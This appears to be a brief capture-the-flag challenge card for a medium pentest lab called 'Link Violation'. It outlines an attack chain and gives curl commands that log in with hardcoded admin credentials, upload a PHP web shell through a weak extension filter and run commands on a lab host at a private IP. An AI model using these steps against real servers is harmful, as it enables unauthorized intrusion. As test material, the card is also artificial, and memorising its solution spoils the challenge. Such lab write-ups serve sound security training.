---
name: ctf-link-violation
description: Reconnaissance and exploitation of a multi-stage internal network with known upload vulnerability and internal service reachability.
---

# Challenge: Link Violation
## Context
- Category: pentest
- Difficulty: medium
- Vuln Type: Upload Vulnerability, Internal Network Penetration
- Hint: 后台上传功能的后缀名检测不够全面。拿到 Shell 后注意看网卡信息和内网网段。

## Attack Chain
1. Authenticate to the public admin panel using hardcoded credentials.
2. Abuse the upload filter to execute PHP and gain command execution as `www-data`.
3. Pivot into the internal network and enumerate reachable services.
4. Exploit weak credentials and internal services to recover flags.

## Key Payloads
```
# Authenticate to the public admin panel
curl -u admin:Admin@123 http://10.0.162.97/admin/login

# Upload a malicious PHP file to gain command execution
curl -F "file=@shell.php" http://10.0.162.97/admin/upload.php

# Execute commands on the compromised host
curl http://10.0.162.97/uploads/shell.php?cmd=id
```
